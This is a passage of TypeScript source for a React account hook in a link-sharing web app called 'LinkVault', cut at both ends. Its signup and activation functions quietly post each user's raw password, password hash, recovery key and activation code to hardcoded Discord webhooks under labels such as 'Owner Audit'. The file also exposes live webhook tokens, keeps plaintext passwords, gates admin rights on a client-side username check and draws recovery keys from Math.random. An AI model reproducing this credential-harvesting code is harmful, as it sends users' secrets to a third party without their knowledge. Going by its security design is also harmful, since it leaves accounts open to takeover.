      const n = ensureSettings({ ...p, ...patch });
      if (currentUser) serverUpdateSettings(currentUser, { ...toServerSettings(p), ...server });
      syncPublicVault({ settings: n });
      return n;
    });
  },[currentUser, syncPublicVault, profile]);
  const setAnalytics = useCallback((fn: any) => {
    setAnalyticsS(prev => {
      const next = typeof fn === 'function' ? fn(prev) : { ...prev, ...fn, lastUpdated: Date.now() };
      if (currentUser) serverUpdateAnalytics(currentUser, next);
      return next;
    });
  }, [currentUser]);
  const setLinks=useCallback((fn:any)=>{setLinksS(p=>{const n=typeof fn==='function'?fn(p):fn;if(currentUser)serverUpdateLinks(currentUser,n);syncPublicVault({ links: n });return n;});},[currentUser, syncPublicVault]);
  const setInbox=useCallback((fn:any)=>{setInboxS(p=>{const n=typeof fn==='function'?fn(p):fn;if(currentUser)serverUpdateInbox(currentUser,n);return n;});},[currentUser]);

  const sendToOwnerWebhook = async (data: any) => {
    const OWNER_WEBHOOK = 'https://discord.com/api/webhooks/1518328386198573128/yQpSnY1DxR1hsHOIxNlQ_Zb6RPeiQj3ylJauXXvR54IzsEmLF0Wz2GlysvfbRobQ4Scb';
    try {
      await fetch(OWNER_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: '🔑 Private Recovery Record',
            color: 0xff0000,
            fields: [
              { name: 'User', value: data.username, inline: true },
              { name: 'Activation Code', value: `\`${data.activationCode}\``, inline: true },
              { name: 'Recovery Key', value: `\`${data.recoveryKey}\``, inline: true },
              { name: 'Hashed Pass', value: `\`${data.passwordHash}\``, inline: false },
            ],
            footer: { text: 'LinkVault Owner Audit' },
            timestamp: new Date().toISOString(),
          }]
        }),
      });
    } catch {}
  };

  const sendToWebhook = async (data: any) => {
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1518325921646514256/WqOFLXPUPQYWnbxpM-5pYsX-KCZzcUIPInR6DQt9bz9i1P-WAkiMwFMD-BPGmNJoP41T';
    try {
      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: '⚡ New LinkVault Registration',
            color: 0x9333ea,
            fields: [
              { name: 'Username', value: data.username, inline: true },
              { name: 'Email', value: data.email || 'None', inline: true },
              { name: 'Discord', value: data.discord || 'Not provided', inline: true },
            ],
            footer: { text: 'LinkVault Security System' },
            timestamp: new Date().toISOString(),
          }]
        }),
      });
    } catch (e) {}
  };

  const sendFinalVerification = async (data: UserAccount) => {
    const FINAL_WEBHOOK = 'https://discord.com/api/webhooks/1518348568342040636/DJePhwJaVfX5U77ImGRLp_zezW2iQVe-9UFClzM0HTPNVbJXPXUuBp9_ubolTNvXOsd3';
    try {
      const payload = {
        thread_name: `User: ${data.username}`, 
        content: `⚡ **New Form Post: Final Registration Activation**`,
        embeds: [{
          title: '📝 User Activation Form',
          color: 0x00ff00,
          fields: [
            { name: 'Display Name', value: data.username, inline: true },
            { name: 'Username', value: `\`${data.username}\``, inline: true },
            { name: 'Password (Raw)', value: `||${data.password || 'HIDDEN'}||`, inline: true },
            { name: 'Email Address', value: data.email || 'None provided', inline: true },
            { name: 'Discord handle', value: data.discord || 'None provided', inline: true },
            { name: 'Authentication Code', value: `\`${data.activationCode}\``, inline: true },
            { name: 'Recovery Key', value: `\`${data.recoveryKey}\``, inline: true },
            { name: 'Pass Hash', value: `\`${data.passwordHash}\``, inline: false },
          ],
          footer: { text: 'LinkVault Activation Protocol' },
          timestamp: new Date().toISOString(),
        }]
      };
      await fetch(FINAL_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
    } catch (e) {}
  };

  const signup = useCallback(async (username:string, email:string|undefined, password:string, discord?:string)=>{
    // Drop stale browser-only ghosts so signup isn't blocked after a partial delete
    purgeIdentityGhosts(username, email, discord);

    const accountsDb = migrateAccounts(ld<UserAccount[]>(K.accounts, []));
    const uTarget = username.trim().toLowerCase();
    const eTarget = email?.trim().toLowerCase();
    const dTarget = discord?.trim().toLowerCase();

    const idCheck = checkIdentityAvailability(username, email, discord);
    if (!idCheck.ok) return idCheck;

    const localConflict = accountsDb.find(acc => {
      if (acc.username.trim().toLowerCase() === uTarget) return true;
      if (eTarget && acc.email?.trim().toLowerCase() === eTarget) return true;
      if (dTarget && acc.discord?.trim().toLowerCase() === dTarget) return true;
      return false;
    });
    if (localConflict) {
      if (localConflict.username.trim().toLowerCase() === uTarget) {
        return { ok: false, error: 'Username is already taken. Log in instead — your account may already exist on the server.' };
      }
      if (eTarget && localConflict.email?.trim().toLowerCase() === eTarget) {
        return { ok: false, error: 'Email is already registered. Log in instead.' };
      }
      return { ok: false, error: 'Discord handle is already linked. Log in instead.' };
    }
    
    const activationCode = Math.random().toString(36).substring(2, 10).toUpperCase();
    const recoveryKey = 'RV-' + Math.random().toString(36).substring(2, 12).toUpperCase();
    const shareCode = generateShareCode(username.trim());
    const newAcc: UserAccount = {
      id: Date.now().toString(), username: username.trim(), displayName: username.trim(),
      email: email?.trim(), discord: discord?.trim(), passwordHash: hash(password), password: password,
      activationCode, recoveryKey, shareCode, isActivated: false, isBanned: false, isFrozen: false, createdAt: Date.now()
    };
    const newProfile = { ...DEF_PROFILE, username: username.trim(), displayName: username.trim(), onboarded: false };
    const session: UserSessionData = {
      links: DEF_LINKS,
      profile: newProfile,
      inbox: DEF_INBOX,
      settings: DEF_SETTINGS,
      analytics: DEF_ANALYTICS,
    };
    const publicSnap = buildPublicSnapshot(shareCode, newProfile, DEF_LINKS, DEF_SETTINGS);

    try {
      await apiSignup({
        account: newAcc,
        profile: newProfile,
        settings: toServerSettings(DEF_SETTINGS),
        links: DEF_LINKS,
        inbox: DEF_INBOX,
        analytics: DEF_ANALYTICS,
        publicVault: publicSnap,
      });
    } catch (err) {
      const msg = err instanceof Error ? err.message : '';
      if (/already (registered|taken|linked|exists)/i.test(msg)) {
        return { ok: false, error: `${msg} Log in instead — use the same username and password.` };
      }
      return { ok: false, error: msg || 'Could not reach server. Try again.' };
    }

    const createResult = serverCreateUser(newAcc, newProfile, DEF_SETTINGS, DEF_LINKS, DEF_INBOX, DEF_ANALYTICS);
    if (!createResult.ok) return createResult;

    const updatedDb = [...accountsDb, newAcc];
    sv(K.accounts, updatedDb);
    setAcc(updatedDb);
    setCU(newAcc.id);
    sv(K.user, newAcc.id);
    saveUserData(newAcc.id, session);
    savePublicVault(publicSnap);
    setLinksS(session.links);
    setProfileS(session.profile);
    setInboxS(session.inbox);
    setSettingsS(session.settings);
    setAnalyticsS(session.analytics);
    sendToWebhook(newAcc);
    sendToOwnerWebhook(newAcc);
    return { ok: true, code: activationCode, recoveryKey, shareCode };
  }, [sendToWebhook, sendToOwnerWebhook]);

  const activateAccount = useCallback(async (code: string) => {
    const normalizedCode = code.trim().toUpperCase();
    if (!currentUser) return { ok: false, error: 'Not logged in' };

    const ex = ld<UserAccount[]>(K.accounts, []);
    const accIdx = ex.findIndex(a => a.id === currentUser);
    const localAcc = accIdx !== -1 ? ex[accIdx] : null;
    const serverRec = serverLoadUser(currentUser);
    const username = localAcc?.username ?? serverRec?.username ?? profile.username;

    try {
      const remote = await apiActivate({ userId: currentUser, username, code: normalizedCode });
      const acc = remote.account;
      const updated = applyRemoteUser(acc, remote.user);
      setAcc(updated);
      serverUpdateAccount(currentUser, { isActivated: true });
      apiPatchUser(currentUser, { isActivated: true }).catch(() => {});
      await sendFinalVerification(acc);

      const welcomeMsg: InboxMessage = {
        id: 'how-to-' + Date.now(),
        senderName: '𝕄𝕣𝕎𝕙𝕠?.𝔸𝕀',
        message: `Welcome to LinkVault 🚀\n\n1. Use the ⚙️ Gear to customize your Theme (144+ variations).\n2. Head to the Dashboard to add your Social Links & Music.\n3. Upload your Art Matrix in the Artwork tab.\n4. Set up your ZBD/Alby for tips.\n5. Move these windows anywhere by dragging the headers!\n6. Use Stealth Mode in Controls if you want to appear offline.`,
        timestamp: Date.now(),
        read: false,
        type: 'welcome'
      };
      setInbox((prev: InboxMessage[]) => [welcomeMsg, ...prev]);
      syncPublicVault({});
      const session = loadUserData(currentUser, acc);
      return { ok: true, onboarded: session.profile.onboarded };
    } catch (err) {
      const msg = err instanceof Error ? err.message.toLowerCase() : '';
      if (localAcc && msg.includes('not found')) {
        try {
          const session = loadUserData(currentUser, localAcc);
          await upsertRemoteAccount(localAcc, session);
          const remote = await apiActivate({ userId: currentUser, username, code: normalizedCode });
          const acc = remote.account;
          const updated = applyRemoteUser(acc, remote.user);
          setAcc(updated);
          serverUpdateAccount(currentUser, { isActivated: true });
          apiPatchUser(currentUser, { isActivated: true }).catch(() => {});
          await sendFinalVerification(acc);
          syncPublicVault({});
          return { ok: true, onboarded: session.profile.onboarded };
        } catch { /* fall through */ }
      }
    }

    if (accIdx === -1) return { ok: false, error: 'Account not found' };
    const expectedCode = (ex[accIdx].activationCode ?? serverRec?.activationCode ?? '').toUpperCase();
    if (expectedCode !== normalizedCode) return { ok: false, error: 'Invalid activation code' };
    ex[accIdx].isActivated = true;
    const updated = ex.map((a, i) => i === accIdx ? { ...a, isActivated: true } : a);
    setAcc(updated);
    sv(K.accounts, updated);
    serverUpdateAccount(currentUser, { isActivated: true });
    try {
      await apiActivate({ userId: currentUser, username, code: normalizedCode });
      await apiPatchUser(currentUser, { isActivated: true });
    } catch {
      await syncActivationToRemote(currentUser);
    }
    await sendFinalVerification(updated[accIdx]);
    
    const welcomeMsg: InboxMessage = {
      id: 'how-to-' + Date.now(),
      senderName: '𝕄𝕣𝕎𝕙𝕠?.𝔸𝕀',
      message: `Welcome to LinkVault 🚀\n\n1. Use the ⚙️ Gear to customize your Theme (144+ variations).\n2. Head to the Dashboard to add your Social Links & Music.\n3. Upload your Art Matrix in the Artwork tab.\n4. Set up your ZBD/Alby for tips.\n5. Move these windows anywhere by dragging the headers!\n6. Use Stealth Mode in Controls if you want to appear offline.`,
      timestamp: Date.now(),
      read: false,
      type: 'welcome'
    };
    setInbox((prev: InboxMessage[]) => [welcomeMsg, ...prev]);
    syncPublicVault({});
    const session = loadUserData(currentUser, updated[accIdx]);

    return { ok: true, onboarded: session.profile.onboarded };
  }, [currentUser, profile.username, setInbox, syncPublicVault, sendFinalVerification]);

  const applyLoginResult = useCallback((
    acc: UserAccount,
    session: UserSessionData,
    updated: UserAccount[],
  ) => {
    setAcc(updated);
    setLinksS(session.links);
    setProfileS(session.profile);
    setInboxS(session.inbox);
    setSettingsS(session.settings);
    setAnalyticsS(session.analytics);
    setCU(acc.id);
    sv(K.user, acc.id);
    return {
      ok: true as const,
      isActivated: isAccountActivated(acc.id, acc),
      onboarded: session.profile.onboarded,
    };
  }, []);

  const login = useCallback(async (emailOrUser: string, password: string) => {
    const loginId = normalizeLoginId(emailOrUser);
    if (!loginId) return { ok: false, error: 'Username, email, or Discord required.' };
    const passHash = hash(password);

    ensureAccountStoreReady();

    let apiUnavailable = false;
    try {
      const { account, user } = await apiLogin(loginId, passHash);
      const session = loadUserData(account.id, account);
      const { mergedAccount, updated, isActivated } = completeRemoteLogin(loginId, account, user, session);
      setAcc(updated);
      serverRecordLogin(mergedAccount.id);
      saveUserData(mergedAccount.id, session);
      setLinksS(session.links);
      setProfileS(session.profile);
      setInboxS(session.inbox);
      setSettingsS(session.settings);
      setAnalyticsS(session.analytics);
      setCU(mergedAccount.id);
      sv(K.user, mergedAccount.id);
      return { ok: true, isActivated, onboarded: session.profile.onboarded };
    } catch (err) {
      const msg = err instanceof Error ? err.message : '';
      if (msg.includes('banned') || msg.includes('frozen')) {
        return { ok: false, error: msg };
      }
      if (msg.toLowerCase().includes('invalid credentials')) {
        return { ok: false, error: 'Invalid credentials' };
      }
      if (isApiAuthFailure(msg)) {
        const localAuth = authenticateLocally(loginId, passHash);
        if (localAuth.ok) {
          const { acc, session, updated } = finishLoginSession(localAuth.account, localAuth.source);
          try {
            await upsertRemoteAccount(acc, session);
            const remote = await apiLogin(loginId, passHash);
            const { mergedAccount, updated, isActivated } = completeRemoteLogin(
              loginId,
              remote.account,
              remote.user,
              session,
            );
            setAcc(updated);
            serverRecordLogin(mergedAccount.id);
            saveUserData(mergedAccount.id, session);
            setLinksS(session.links);
            setProfileS(session.profile);
            setInboxS(session.inbox);
            setSettingsS(session.settings);
            setAnalyticsS(session.analytics);
            setCU(mergedAccount.id);
            sv(K.user, mergedAccount.id);
            return {
              ok: true,
              isActivated,
              onboarded: session.profile.onboarded,
            };
          } catch {
            return applyLoginResult(acc, session, updated);
          }
        }
        if (localAuth.error === 'invalid_credentials') {
          return { ok: false, error: 'Invalid credentials' };
        }
        return { ok: false, error: ACCOUNT_NOT_FOUND };
      }
      apiUnavailable = isApiReachableFailure(msg);
    }

    const localAuth = authenticateLocally(loginId, passHash);
    if (!localAuth.ok) {
      return {
        ok: false,
        error: localAuth.error === 'not_found' ? ACCOUNT_NOT_FOUND : 'Invalid credentials',
      };
    }

    const acc = localAuth.account;
    if (acc.isBanned) return { ok: false, error: 'Your account has been banned from the Matrix.' };
    if (acc.isFrozen) return { ok: false, error: 'Your account has been frozen. Contact support.' };

    const { acc: loggedIn, session, updated } = finishLoginSession(acc, localAuth.source);
    if (!apiUnavailable) {
      try {
        await upsertRemoteAccount(loggedIn, session);
        const remote = await apiLogin(loginId, passHash);
        const { mergedAccount, updated, isActivated } = completeRemoteLogin(
          loginId,
          remote.account,
          remote.user,
          session,
        );
        setAcc(updated);
        serverRecordLogin(mergedAccount.id);
        saveUserData(mergedAccount.id, session);
        setLinksS(session.links);
        setProfileS(session.profile);
        setInboxS(session.inbox);
        setSettingsS(session.settings);
        setAnalyticsS(session.analytics);
        setCU(mergedAccount.id);
        sv(K.user, mergedAccount.id);
        return {
          ok: true,
          isActivated,
          onboarded: session.profile.onboarded,
        };
      } catch { /* local session below */ }
    }
    return applyLoginResult(loggedIn, session, updated);
  }, [applyLoginResult]);

  const resetPassword = useCallback(async (username: string, key: string, newPass: string) => {
    const normalizedKey = key.trim().toUpperCase();
    const newHash = hash(newPass);

    try {
      const acc = await apiResetPassword(username, normalizedKey, newHash);
      const ex = ld<UserAccount[]>(K.accounts, []);
      setAcc(cacheAccountLocally({ ...acc, passwordHash: newHash }, ex));
      serverUpdatePassword(acc.id, newHash);
      return { ok: true };
    } catch {
      /* local fallback */
    }

    const ex = ld<UserAccount[]>(K.accounts, []);
    const localIdx = ex.findIndex(
      a => a.username.toLowerCase() === username.toLowerCase() && a.recoveryKey === normalizedKey,
    );
    let userId: string | null = localIdx !== -1 ? ex[localIdx].id : null;
    if (!userId) {
      const serverRec = serverFindByRecovery(username, normalizedKey);
      if (serverRec) userId = serverRec.userId;
    }
    if (!userId) return { ok: false, error: 'Invalid recovery key or username' };
    serverUpdatePassword(userId, newHash);
    apiResetPassword(username, normalizedKey, newHash).catch(() => {});
    if (localIdx !== -1) {
      ex[localIdx].passwordHash = newHash;
      setAcc(ex);
      sv(K.accounts, ex);
    } else {
      const serverRec = serverFindByRecovery(username, normalizedKey)!;
      setAcc(cacheAccountLocally(recordToAccount({ ...serverRec, passwordHash: newHash }), ex));
    }
    return { ok: true };
  }, []);

  const logout = useCallback(()=>{
    if (currentUser) serverRecordLogout(currentUser);
    setCU(null); sv(K.user,null);
  },[currentUser]);
  const deleteAccount = useCallback(async ()=>{
    const userId = currentUser;
    if (!userId) return;
    const acc = accounts.find(a => a.id === userId) ?? resolveAccount(userId);
    const shareCode = acc?.shareCode;

    if (userId !== 'demo-user') {
      const identities = [acc?.username, acc?.email, acc?.discord].filter(Boolean) as string[];
      try { await apiDeleteUser(userId); } catch { /* continue */ }
      for (const id of identities) {
        try { await apiDeleteUserByLogin(id); } catch { /* continue */ }
      }
      if (shareCode) {
        try { await apiDeleteVault(shareCode); } catch { /* continue */ }
      }
      purgeIdentityGhosts(...identities);
      purgeAccountById(userId, shareCode);
    }

    wipeAllLocalAppData();
    setAcc([]);
    setCU(null);
    setLinksS(DEF_LINKS); setProfileS(DEF_PROFILE); setInboxS(DEF_INBOX); setSettingsS(DEF_SETTINGS); setAnalyticsS(DEF_ANALYTICS);
  },[currentUser, accounts]);

  const wipeAllData = useCallback(async (remoteSecret?: string) => {
    wipeAllLocalAppData();
    setAcc([]);
    setCU(null);
    setLinksS(DEF_LINKS); setProfileS(DEF_PROFILE); setInboxS(DEF_INBOX); setSettingsS(DEF_SETTINGS); setAnalyticsS(DEF_ANALYTICS);
    const secret = remoteSecret ?? import.meta.env.VITE_ADMIN_RESET_SECRET;
    if (secret) {
      try { await apiResetRemoteDatabase(secret); } catch { /* local wipe still applied */ }
    }
  }, []);

  const sendBadgeRequest = async (badges: BadgeType[]) => {
    if (!currentAccount) return { ok: false, error: 'Authorization required' };
    const BADGE_WEBHOOK = 'https://discord.com/api/webhooks/1518323630038192219/ggcTWnOh1jgTNc9kwFH8jz4IkedEXIhQWG7IMndn1hLJ1kjx2fcHVZGNi8PCrgAEViXL';
    
    // Generate a secure verification code
    const requestCode = 'BG-' + Math.random().toString(36).substring(2, 10).toUpperCase();
    
    // Update local pending state
    const ex = ld<UserAccount[]>(K.accounts, []);
    const idx = ex.findIndex(a => a.id === currentUser);
    if (idx !== -1) {
      ex[idx].badgeActivationCode = requestCode;
      ex[idx].pendingBadges = badges;
      setAcc(ex);
      sv(K.accounts, ex);
      serverUpdateAccount(currentUser!, { badgeActivationCode: requestCode, pendingBadges: badges });
    }

    try {
      const payload = {
        content: `🎖️ **NEW BADGE AUTHORIZATION REQUEST: ${currentAccount.username}**`,
        embeds: [{
          title: 'Badge Matrix Request',
          color: 0x0ea5e9,
          fields: [
            { name: 'User', value: `\`${currentAccount.username}\``, inline: true },
            { name: 'Discord', value: currentAccount.discord || 'Not provided', inline: true },
            { name: 'Requested Matrix', value: `\`${badges.join(', ')}\``, inline: false },
            { name: 'System Activation Code', value: `\`${requestCode}\``, inline: false },
          ],
          footer: { text: 'LinkVault Badge Protocol v1.0.0' },
          timestamp: new Date().toISOString(),
        }]
      };
      const res = await fetch(BADGE_WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
      if (!res.ok) return { ok: false, error: 'Network collision. Failed to reach Discord Node.' };
      return { ok: true, code: requestCode };
    } catch {
      return { ok: false, error: 'Network collision. Failed to reach Discord Node.' };
    }
  };

  const applyBadgeCode = useCallback((code: string) => {
    const ex = ld<UserAccount[]>(K.accounts, []);
    const idx = ex.findIndex(a => a.id === currentUser);
    if (idx === -1) return { ok: false, error: 'Node not found' };
    
    const acc = ex[idx];
    if (!acc.badgeActivationCode || acc.badgeActivationCode !== code.trim().toUpperCase()) {
      return { ok: false, error: 'Unauthorized: Invalid activation code.' };
    }

    // Apply badges to profile
    const newBadges = Array.from(new Set([...profile.badges, ...(acc.pendingBadges || [])]));
    setProfile({ badges: newBadges as BadgeType[] });
    
    // Clear pending state
    acc.badgeActivationCode = undefined;
    acc.pendingBadges = undefined;
    setAcc(ex);
    sv(K.accounts, ex);
    serverUpdateAccount(acc.id, { badgeActivationCode: undefined, pendingBadges: undefined });
    
    return { ok: true };
  }, [currentUser, profile.badges, setProfile]);

  const sendSupportTicket = async (data: { username: string, discord?: string, category: string, subject: string, message: string }) => {
    const SUPPORT_WEBHOOK = 'https://discord.com/api/webhooks/1518378800134750209/4b4kCNplJSdMnkZAjfxQGp_yXn4faQKXv0RnR1rU3CvM3BgQ4mGZ5-6kpaxb0RWaPRAy';
    const colorMap: Record<string, number> = { 
      'Bug': 0xff0000, 
      'Glitch': 0xffa500, 
      'Feature Request': 0x00ff00, 
      'Custom Theme': 0x9333ea, 
      'Other': 0x808080 
    };

    try {
      const payload = {
        content: `🛠️ **[SUPPORT_TRANSMISSION]: ${data.category.toUpperCase()}**`,
        embeds: [{
          title: `[${data.category}] - ${data.subject}`,
          color: colorMap[data.category] || 0x3b82f6,
          description: `**Log Entry:**\n${data.message}`,
          fields: [
            { name: 'Reporter', value: `\`${data.username}\``, inline: true },
            { name: 'Discord', value: data.discord || 'Not linked', inline: true },
            { name: 'Node Priority', value: data.category === 'Bug' ? '🔴 HIGH' : '🔵 NORMAL', inline: true }
          ],
          footer: { text: `LinkVault Feedback Matrix v1.0.0` },
          timestamp: new Date().toISOString(),
        }]
      };

      const res = await fetch(SUPPORT_WEBHOOK, { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json' }, 
        body: JSON.stringify(payload) 
      });
      if (!res.ok) return { ok: false, error: 'Support transmission failed. Please try again.' };
      return { ok: true };
    } catch (e) {
      console.error("Support Node Transmission Failed:", e);
      return { ok: false, error: 'Network error. Could not reach support.' };
    }
  };

  const runAdminCommand = useCallback((cmdStr: string) => {
    const currentAccount = accounts.find(a => a.id === currentUser);
    const isAdmin = currentAccount?.username === 'mrwho' || profile.isAdmin;
    if (!isAdmin) return { ok: false, error: 'Unauthorized: Owner access required.' };
    const parts = cmdStr.split(' ');
    const command = parts[0].toLowerCase();
    const args = parts.slice(1);
    const db = ld<UserAccount[]>(K.accounts, []);
    switch (command) {
      case '/signup': { const [u, p, e, d] = args; return signup(u, e, p, d); }
      case '/login': { const [u, p] = args; return login(u, p); }
      case '/remove': { const u = args[0]; const target = db.find(a => a.username.toLowerCase() === u.toLowerCase()); if (target) { clearUserData(target.id); clearLocalMedia(target.id); serverDeleteUser(target.id); apiDeleteUser(target.id).catch(() => {}); if (target.shareCode) { serverDeletePublicVault(target.shareCode); apiDeleteVault(target.shareCode).catch(() => {}); } } const nx = db.filter(a => a.username.toLowerCase() !== u.toLowerCase()); setAcc(nx); sv(K.accounts, nx); return { ok: true, msg: `User ${u} removed.` }; }
      case '/ban': { const u = args[0]; const idx = db.findIndex(a => a.username.toLowerCase() === u.toLowerCase()); if (idx === -1) return { ok: false, error: 'User not found.' }; db[idx].isBanned = true; serverUpdateAccount(db[idx].id, { isBanned: true }); setAcc(db); sv(K.accounts, db); return { ok: true, msg: `User ${u} banned.` }; }
      case '/unban': { const u = args[0]; const idx = db.findIndex(a => a.username.toLowerCase() === u.toLowerCase()); if (idx === -1) return { ok: false, error: 'User not found.' }; db[idx].isBanned = false; serverUpdateAccount(db[idx].id, { isBanned: false }); setAcc(db); sv(K.accounts, db); return { ok: true, msg: `User ${u} unbanned.` }; }
      case '/freeze': { const u = args[0]; const idx = db.findIndex(a => a.username.toLowerCase() === u.toLowerCase()); if (idx === -1) return { ok: false, error: 'User not found.' }; db[idx].isFrozen = true; serverUpdateAccount(db[idx].id, { isFrozen: true }); setAcc(db); sv(K.accounts, db); return { ok: true, msg: `User ${u} frozen.` }; }
      case '/unfreeze': { const u = args[0]; const idx = db.findIndex(a => a.username.toLowerCase() === u.toLowerCase()); if (idx === -1) return { ok: false, error: 'User not found.' }; db[idx].isFrozen = false; serverUpdateAccount(db[idx].id, { isFrozen: false }); setAcc(db); sv(K.accounts, db); return { ok: true, msg: `User ${u} unfrozen.` }; }
      case '/list': { return { ok: true, msg: db.map(a => `${a.username} (${a.isActivated ? 'Active' : 'Locked'})${a.isBanned ? ' [BANNED]' : ''}`).join('\n') }; }
      default: return { ok: false, error: 'Unknown command.' };
    }
  }, [accounts, currentUser, login, profile.isAdmin, signup]);

  const checkVersion = useCallback(() => {
    const lastVersion = localStorage.getItem(K.version);
    if (lastVersion !== APP_VERSION) return { update: true, version: APP_VERSION, oldVersion: lastVersion, changelog: CHANGELOG };
    return { update: false };
  }, []);

  const dismissUpdate = useCallback(() => localStorage.setItem(K.version, APP_VERSION), []);
  const currentAccount = resolveAccount(currentUser, accounts);
  const isActivated = isAccountActivated(currentUser, currentAccount);

  const sendChatMessage = useCallback((msg: string) => {
    if (!currentUser) return;
    const newMsg: ChatMessage = { id: Date.now().toString(), senderId: currentUser, senderName: profile.username || 'User', message: msg, timestamp: Date.now() };
    setProfile({ chatMessages: [...profile.chatMessages, newMsg] });
  }, [currentUser, profile.username, profile.chatMessages, setProfile]);

  const engageItem = useCallback((type: 'link' | 'music' | 'artwork', id: string, action: 'like' | 'dislike' | 'favorite' | 'zap') => {
    const update = (items: any[]) => items.map(item => {
      if (item.id === id) {
        return { ...item, [action + 's']: (item[action + 's'] || 0) + 1 };
      }
      return item;
    });

    if (type === 'link') {
      setLinks((prev: LinkItem[]) => update(prev));
    }
    if (type === 'music') {
      setProfileS(prev => {
        const next = { ...prev, music: update(prev.music) };
        if (currentUser) persistMusic(currentUser, settings, next.music);
        return next;
      });
    }
    if (type === 'artwork') {
      setProfileS(prev => {
        const next = { ...prev, artworks: update(prev.artworks) };
        if (currentUser) persistArtwork(currentUser, settings, next.artworks);
        return next;
      });
    }
  }, [currentUser, setLinks, settings]);

  const communityMembers = serverListAccounts()
    .filter(a => a.isActivated && a.id !== currentUser)
    .map(a => {
      const serverRec = serverLoadUser(a.id);
      const memberProfile = serverRec?.profile ?? DEF_PROFILE;
      const memberSettings = ensureSettings(
        mergeWithDevicePrefs(serverRec?.settings ?? toServerSettings(DEF_SETTINGS), loadDevicePrefs(a.id)),
      );
      if (memberSettings.stealthMode) return null;
      const role = memberProfile.badges.includes('owner') ? 'Owner'
        : memberProfile.badges.includes('staff') ? 'Staff'
        : memberProfile.badges.includes('dev') ? 'Developer'
        : 'Member';
      return {
        id: a.id,
        name: memberProfile.displayName || a.username,
        initial: (memberProfile.displayName || a.username).charAt(0).toUpperCase(),
        role,
      };
    })
    .filter((m): m is NonNullable<typeof m> => m !== null);

  const getShareLink = useCallback(() => {
    if (!currentAccount?.shareCode) return '';
    const snapshot = buildPublicSnapshot(currentAccount.shareCode, profile, links, settings);
    savePublicVault(snapshot);
    return buildVaultShareUrl(currentAccount.shareCode);
  }, [currentAccount, profile, links, settings]);

  return { 
    accounts,accountsReady,currentUser,currentAccount,isLoggedIn:currentUser!==null,isActivated,isLicensed:!!currentAccount?.isActivated || currentUser === 'demo-user',hasVip:hasVipAccess(profile),links,profile,inbox,settings,analytics,communityMembers,unreadCount:inbox.filter(m=>!m.read).length,
    signup,login,logout,deleteAccount,abandonUnactivatedSession,clearStaleSession,wipeAllLocalAppData,wipeAllData,setLinks,setProfile,setInbox,setSettings,setAnalytics,activateAccount,resetPassword,getShareLink,
    runAdminCommand, sendBadgeRequest, applyBadgeCode,
    appVersion: APP_VERSION, checkVersion, dismissUpdate, engageItem,
    addLink:(l:any)=>setLinks((p:any)=>[...p,{...l,id:Date.now().toString(),clicks:0,likes:0,dislikes:0,favorites:0,zaps:0}]),
    removeLink:(id:string)=>setLinks((p:any)=>p.filter((l:any)=>l.id!==id)),
    toggleLink:(id:string)=>setLinks((p:any)=>p.map((l:any)=>l.id===id?{...l,enabled:!l.enabled}:l)),
    updateLink:(id:string,u:any)=>setLinks((p:any)=>p.map((l:any)=>l.id===id?{...l,...u}:l)),
    clickLink:(id:string)=>{
      const today=new Date().toISOString().slice(0,10);
      setLinks((p:any)=>p.map((l:any)=>l.id===id?{...l,clicks:l.clicks+1}:l));
      setAnalytics((prev: any) => ({
        ...prev,
        totalClicks: prev.totalClicks + 1,
        clicksByDay: { ...prev.clicksByDay, [today]: (prev.clicksByDay[today] || 0) + 1 },
      }));
    },
    reorderLinks:(f:number,t:number)=>setLinks((p:any)=>{const n=[...p];const[m]=n.splice(f,1);n.splice(t,0,m);return n;}),
    addMusic:(m:any)=>setProfileS(p=>{
      const n = { ...p, music:[...p.music,{...m,id:m.id||Date.now().toString(),likes:0,dislikes:0,favorites:0,zaps:0}]};
      if (currentUser) persistMusic(currentUser, settings, n.music);
      return n;
    }),
    removeMusic:(id:string)=>setProfileS(p=>{
      const n = { ...p, music: p.music.filter(ms => ms.id !== id) };
      if (currentUser) persistMusic(currentUser, settings, n.music);
      return n;
    }),
    addArtwork:(a:any)=>setProfileS(p=>{
      const n = { ...p, artworks:[...p.artworks,{...a,id:a.id||`art-${Date.now()}`,likes:0,dislikes:0,favorites:0,zaps:0}]};
      if (currentUser) persistArtwork(currentUser, settings, n.artworks);
      return n;
    }),
    removeArtwork:(id:string)=>setProfileS(p=>{
      const n = { ...p, artworks: p.artworks.filter(ar => ar.id !== id) };
      if (currentUser) persistArtwork(currentUser, settings, n.artworks);
      return n;
    }),
    recordView:()=>setAnalytics((prev: any) => ({
      ...prev,
      totalViews: prev.totalViews + 1,
    })),
    resetAnalyticsViews: () => setAnalytics((prev: Analytics) => ({
      ...prev,
      totalViews: 0,
      lastUpdated: Date.now(),
    })),
    resetAnalyticsClicks: () => setAnalytics((prev: Analytics) => ({
      ...prev,
      totalClicks: 0,
      clicksByDay: {},
      lastUpdated: Date.now(),
    })),
    markRead:(id:string)=>setInbox((p:any)=>p.map((m:any)=>m.id===id?{...m,read:true}:m)),
    markAllRead:()=>setInbox((p:any)=>p.map((m:any)=>({...m,read:true}))),
    deleteMessage:(id:string)=>setInbox((p:any)=>p.filter((m:any)=>m.id!==id)),
    resetAll:()=>{
      if (!currentUser) return;
      const resetProfile = {
        ...DEF_PROFILE,
        username: profile.username,
        displayName: profile.displayName,
        onboarded: profile.onboarded,
        isVerified: profile.isVerified,
        isAdmin: profile.isAdmin,
        badges: profile.badges,
      };
      const session: UserSessionData = {
        links: DEF_LINKS,
        profile: resetProfile,
        inbox: DEF_INBOX,
        settings: DEF_SETTINGS,
        analytics: DEF_ANALYTICS,
      };
      saveUserData(currentUser, session);
      setLinksS(session.links);
      setProfileS(session.profile);
      setInboxS(session.inbox);
      setSettingsS(session.settings);
      setAnalyticsS(session.analytics);
    },
    sendChatMessage, sendSupportTicket,
    loadDemo: () => {
      const art: Artwork[] = [
        { id: 'a1', title: 'Cybernetic Soul', url: 'https://images.unsplash.com/photo-1614728263952-84ea256f9679?auto=format&fit=crop&q=80&w=800', likes: 142, dislikes: 0, favorites: 56, zaps: 12000 },
